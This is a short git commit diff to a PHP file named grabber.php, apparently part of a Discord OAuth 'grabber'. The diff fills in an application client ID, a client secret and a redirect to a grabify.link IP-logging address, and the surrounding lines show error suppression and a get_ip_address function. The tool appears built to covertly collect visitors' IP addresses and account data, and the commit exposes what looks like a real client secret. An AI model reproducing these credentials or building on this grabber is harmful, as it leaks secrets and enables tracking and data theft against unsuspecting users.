008a455f3e7afcaae557f9a2ddd6929c4c7551ad
aggghhhhhhboi <65320275+aggghhhhhhboi@users.noreply.github.com>
2020-05-13 21:00:20 -0400

    Update grabber.php

--- grabber.php
+++ grabber.php
@@ -2,9 +2,9 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
-$client_secret = ""; //CLIENT SECRET HERE
-$redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
+$client_id     = ""; //710291752212496444
+$client_secret = ""; //8-wpBLQ082klOpslsWv64z411zXRztZ5
+$redirect      = ""; //https://grabify.link/YDCOYM
 
 function get_ip_address()
 {
